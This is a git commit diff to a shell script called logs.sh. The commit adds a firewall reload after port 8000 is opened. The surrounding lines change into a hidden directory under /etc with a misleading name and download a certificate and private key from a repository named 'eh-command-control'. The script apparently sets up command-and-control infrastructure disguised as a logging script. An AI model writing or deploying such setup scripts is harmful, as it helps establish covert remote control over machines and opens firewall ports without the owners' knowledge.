4bb4652afbb4ff913c4924659701ccce304b18a6
Nidhi Pabbathi <123031844+npabbathi@users.noreply.github.com>
2026-03-26 21:18:01 -0500

    Add firewall reload command in logs.sh
    Reload firewall after adding port 8000.

--- logs.sh
+++ logs.sh
@@ -1,6 +1,7 @@
 #!/bin/bash
 cd /etc/.python-certifications/
 firewall-cmd --add-port=8000/tcp
+firewall-cmd --reload
 curl -fsSL --retry 3 https://github.com/AidanNgo/eh-command-control/raw/refs/heads/main/cert.pem -o cert.pem
 
 curl -fsSL --retry 3 https://github.com/AidanNgo/eh-command-control/raw/refs/heads/main/key.pem -o key.pem
